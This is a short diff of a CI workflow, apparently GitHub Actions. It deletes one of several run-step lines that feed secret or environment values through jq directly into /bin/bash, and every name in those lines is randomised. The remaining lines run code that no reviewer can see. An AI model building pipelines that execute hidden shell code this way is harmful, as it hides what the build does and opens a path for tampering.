@@ -22,7 +22,6 @@ jobs:
           sxon470: ${{ secrets.sxon470 }}
         run: |
           printf '%s' "$sxon470" | jq -r .t57230 | /bin/bash
-          echo $byv86 | jq -r .odo4 | /bin/bash
           echo $a75 | jq -r .rvlgm4550 | /bin/bash
           printf '%s' "$y1291" | jq -r .pzr30844 | /bin/bash
           echo $gom90391 | jq -r .zx792 | /bin/bash
